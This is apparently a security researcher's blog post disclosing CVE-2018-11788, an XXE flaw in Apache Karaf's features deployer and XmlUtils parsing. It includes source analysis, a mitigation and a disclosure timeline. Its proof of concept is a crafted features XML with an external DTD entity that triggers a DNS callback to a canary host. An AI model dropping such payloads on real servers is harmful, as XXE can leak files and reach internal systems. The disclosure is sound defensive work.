---
layout: post
title: APACHE KARAF XXE VULNERABILITY (CVE-2018-11788)
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - avfisher</p>

## Summary

&nbsp;&nbsp;&nbsp;Apache Karaf is a modern and polymorphic applications container. It’s a lightweight, powered, and enterprise ready container powered by OSGi. Apache Karaf is a “product project”, providing a complete and turnkey runtime. The runtime is “multi-facets”, meaning that you can deploy different kind of applications: OSGi or non OSGi, webapplication, services based, etc.

&nbsp;&nbsp;&nbsp;In a recent research on Apache Karaf, I found some XXE (XML eXternal Entity injection) vulnerabilities existed on its XML parsers. It is caused that the parsers improperly parse XML document.

## Affected version

* Apache Karaf <= 4.2.1
* Apache Karaf <= 4.1.6

## Analysis

&nbsp;&nbsp;&nbsp;According to the <a href="https://karaf.apache.org/manual/latest/#_deployer" target="_blank">official manual</a>, Apache Karaf provides a features deployer by default, which allows users to “hot deploy” a features XML by dropping the file directly in the deploy folder.

When you drop a features XML in the deploy folder, the features deployer does:

* register the features XML as a features repository
* the features with install attribute set to “auto” will be automatically installed by the features deployer.

For instance, dropping the following XML in the deploy folder will automatically install feature1 and feature2, whereas feature3 won’t be installed:

{% highlight xml %}

<?xml version="1.0" encoding="UTF-8"?>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="feature1" version="1.0" install="auto">
        ...
    </feature>
    <feature name="feature2" version="1.0" install="auto">
        ...
    </feature>
    <feature name="feature3" version="1.0">
        ...
    </feature>
</features>

{% endhighlight %}

In order to learn how deployer handle the XML file, I checked the source codes of Karaf in Github and found the invocations as follows:

* Activatorclass invokes <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/osgi/Activator.java#L38" target="_blank">doStart()</a> function to start a listener for deployer
* doStart() function invokes <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L88" href="_blank">FeatureDeploymentListener.init()</a> to initial a listener
* Then it calls function <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L180" target="_blank">bundleChanged</a> – <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L145" target="_blank">canHandle</a> – <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L258" target="_blank">getRootElementName</a> to parse XML document by leveraging <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/specs/java.xml/src/main/java/javax/xml/stream/XMLInputFactory.java" target="_blank">XMLInputFactory</a>

But upon further investigation on function `getRootElementName` as below, there is no any prevention against XXE.

{% highlight java %}

private QName getRootElementName(File artifact) throws Exception {
    if (xif == null) {
        xif = XMLInputFactory.newFactory();
        xif.setProperty(XMLInputFactory.IS_NAMESPACE_AWARE, true);
    }
    try (InputStream is = new FileInputStream(artifact)) {
        XMLStreamReader sr = xif.createXMLStreamReader(is);
        sr.nextTag();
        return sr.getName();
    }
}

{% endhighlight %}

Therefore, I assumed it posed a potential security risk for Apache Karaf.

## Proof of Concept

In order to verify my assumption, I tested on the latest official release of Apache Karaf 4.2.0 which was downloaded from <a href="https://karaf.apache.org/download.html" target="_blank">https://karaf.apache.org/download.html</a> as follows.

1 - Download the binary distribution from <a href="http://www.apache.org/dyn/closer.lua/karaf/4.2.0/apache-karaf-4.2.0.tar.gz" target="_blank">Apache Karaf 4.2.0</a>

2 - Uncompress the package and locate to folderbinto start Karaf command console as shown below

{% highlight java %}

bin$ ./karaf
      __ __                  ____      
     / //_/____ __________ _/ __/      
    / ,<  / __ `/ ___/ __ `/ /_        
   / /| |/ /_/ / /  / /_/ / __/        
  /_/ |_|\__,_/_/   \__,_/_/         

Apache Karaf (4.2.0)

Hit '<tab>' for a list of available commands
and '[cmd] --help' for help on a specific command.
Hit '<ctrl-d>' or type 'system:shutdown' or 'logout' to shutdown Karaf.

karaf@root()>

{% endhighlight %}

3 - Generate a DNS token on <a href="https://canarytokens.org/generate" target="_blank">https://canarytokens.org/generate</a>, e.g.27av6zyg33g8q8xu338uvhnsc.canarytokens.com

4 - Craft a XML file and add an external entity with the generated DNS token embedded in DTDs as below:

{% highlight xml %}

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>

{% endhighlight %}

5 - Copy the crafted XML file under folder deploy:

{% highlight java %}

apache-karaf-4.2.0$ cd deploy/
deploy$ tree
.
├── README
└── poc.xml

{% endhighlight %}

6 - Wait for a while, and then you will see the DNS requests from your testing machine, which means the XML parser is trying to load external entities embedded in DTDs.

<img src="https://i.loli.net/2019/01/26/5c4c5f19efd1c.png">

## Mitigation

Follow the OWASP guide below which provides concise information to prevent this vulnerability. <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java" target="_blank">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a>

For instance, adding codes below to disable DTDs and external entities in function <a href="https://github.com/apache/karaf/blob/karaf-4.2.1/deployer/features/src/main/java/org/apache/karaf/deployer/features/FeatureDeploymentListener.java#L258" target="_blank">getRootElementName</a>.

{% highlight java %}

xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); // This disables DTDs entirely for that factory
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false); // disable external entities

{% endhighlight %}

## Extra information

Apart from the finding mentioned above, I also found another class XmlUtils in Apache Karaf project didn’t add any protection from XXE vulnerability when parsing XML document.

{% highlight java %}

package org.apache.karaf.util;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.transform.Result;
import javax.xml.transform.Source;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerConfigurationException;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;

import org.w3c.dom.Document;
import org.xml.sax.ErrorHandler;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;

/**
 * Utils class to manipulate XML document in a thread safe way.
 */
public class XmlUtils {

    private static final ThreadLocal<DocumentBuilderFactory> DOCUMENT_BUILDER_FACTORY = new ThreadLocal<>();
    private static final ThreadLocal<TransformerFactory> TRANSFORMER_FACTORY = new ThreadLocal<>();
    private static final ThreadLocal<SAXParserFactory> SAX_PARSER_FACTORY = new ThreadLocal<>();

    public static Document parse(String uri) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        try {
            return db.parse(uri);
        } finally {
            db.reset();
        }
    }

    public static Document parse(InputStream stream) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        try {
            return db.parse(stream);
        } finally {
            db.reset();
        }
    }

    public static Document parse(File f) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        try {
            return db.parse(f);
        } finally {
            db.reset();
        }
    }

    public static Document parse(File f, ErrorHandler errorHandler) throws TransformerException, IOException, SAXException, ParserConfigurationException {
        DocumentBuilder db = documentBuilder();
        db.setErrorHandler(errorHandler);
        try {
            return db.parse(f);
        } finally {
            db.reset();
        }
    }

    public static void transform(Source xmlSource, Result outputTarget) throws TransformerException {
        Transformer t = transformer();
        try {
            t.transform(xmlSource, outputTarget);
        } finally {
            t.reset();
        }
    }

    public static void transform(Source xsltSource, Source xmlSource, Result outputTarget) throws TransformerException {
        Transformer t = transformer(xsltSource);
        try {
            t.transform(xmlSource, outputTarget);
        } finally {
            t.reset();
        }
    }

    public static XMLReader xmlReader() throws ParserConfigurationException, SAXException {
        SAXParserFactory spf = SAX_PARSER_FACTORY.get();
        if (spf == null) {
            spf = SAXParserFactory.newInstance();
            spf.setNamespaceAware(true);
            SAX_PARSER_FACTORY.set(spf);
        }
        return spf.newSAXParser().getXMLReader();
    }

    public static DocumentBuilder documentBuilder() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DOCUMENT_BUILDER_FACTORY.get();
        if (dbf == null) {
            dbf = DocumentBuilderFactory.newInstance();
            dbf.setNamespaceAware(true);
            DOCUMENT_BUILDER_FACTORY.set(dbf);
        }
        return dbf.newDocumentBuilder();
    }

    public static Transformer transformer() throws TransformerConfigurationException {
        TransformerFactory tf = TRANSFORMER_FACTORY.get();
        if (tf == null) {
            tf = TransformerFactory.newInstance();
            TRANSFORMER_FACTORY.set(tf);
        }
        return tf.newTransformer();
    }

    private static Transformer transformer(Source xsltSource) throws TransformerConfigurationException {
        TransformerFactory tf = TRANSFORMER_FACTORY.get();
        if (tf == null) {
            tf = TransformerFactory.newInstance();
            TRANSFORMER_FACTORY.set(tf);
        }
        return tf.newTransformer(xsltSource);
    }

}

{% endhighlight %}

## Timeline

* 2018-08-22: Reported this issue to Apache Security team.
* 2018-09-26: Apache Karaf team confirmed and fixed the issue in <a href="https://issues.apache.org/jira/browse/KARAF-5911" target="_blank">KARAF-5911</a>.
* 2018-11-30: Apache Karaf 4.1.7 was released with the fix.
* 2018-12-18: Apache Karaf 4.2.2 was released with the fix.
* 2019-01-06: Apache Karaf announced CVE-2018-11788 on this issue.

## Reference

* https://karaf.apache.org/security/cve-2018-11788.txt
* https://issues.apache.org/jira/browse/KARAF-5911
* https://gitbox.apache.org/repos/asf?p=karaf.git;h=cc3332e
* https://gitbox.apache.org/repos/asf?p=karaf.git;h=1ffa6d1
* https://github.com/brianwrf/CVE-2018-11788